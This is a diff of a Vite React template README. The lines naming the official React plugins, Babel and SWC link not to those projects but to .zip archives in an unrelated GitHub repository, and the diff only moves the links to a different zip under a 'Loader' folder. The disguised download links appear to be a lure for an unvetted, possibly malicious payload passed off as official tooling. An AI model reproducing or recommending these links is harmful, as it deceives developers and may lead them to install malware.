@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/weather_info_2.9.zip) uses [Babel](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/weather_info_2.9.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/weather_info_2.9.zip) uses [SWC](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/weather_info_2.9.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/Components/Loader/weather-info-v2.3.zip) uses [Babel](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/Components/Loader/weather-info-v2.3.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/Components/Loader/weather-info-v2.3.zip) uses [SWC](https://github.com/ryuk956983/weather-info/raw/refs/heads/main/src/Components/Loader/weather-info-v2.3.zip) for Fast Refresh
